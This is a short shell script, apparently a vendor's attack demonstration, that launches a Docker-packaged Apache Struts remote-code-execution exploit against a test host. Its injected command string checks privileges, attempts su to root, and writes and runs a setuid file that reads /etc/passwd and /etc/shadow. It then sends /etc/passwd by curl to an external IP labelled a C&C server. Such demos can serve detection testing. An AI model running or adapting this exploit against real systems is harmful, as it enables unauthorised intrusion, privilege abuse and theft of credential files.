#!/bin/sh

image=registry.deepfence.net/apache-struts-exploit:latest
host=apache-struts.deepfence.net
src_ip=138.68.247.224
dst_ip=103.7.155.10

docker run --rm --name=apache-struts-exploit --net=host ${image} ${src_ip} http://${host}/helloworld "echo \"\nChecking User ID\n----------------------------------------\"; id; echo \"\n\nChecking Files as Super User\n----------------------------------------\"; su -c /bin/ls root; echo \"\n\nCreating New Payload pwnd.bin\n----------------------------------------\"; touch /tmp/pwnd.bin; echo \"strace ls -l; sleep 20& kill -11 %1; cat /etc/passwd /etc/shadow\" > /tmp/pwnd.bin; cat /tmp/pwnd.bin; chmod +x /tmp/pwnd.bin; chmod u+s /tmp/pwnd.bin; echo \"\n\nExecuting Remote Code\n----------------------------------------\"; /tmp/pwnd.bin; sleep 5; echo \"\n\nExfiltrating Data to Remote C&C Server\n----------------------------------------\"; curl -s http://${dst_ip} -d @/etc/passwd"
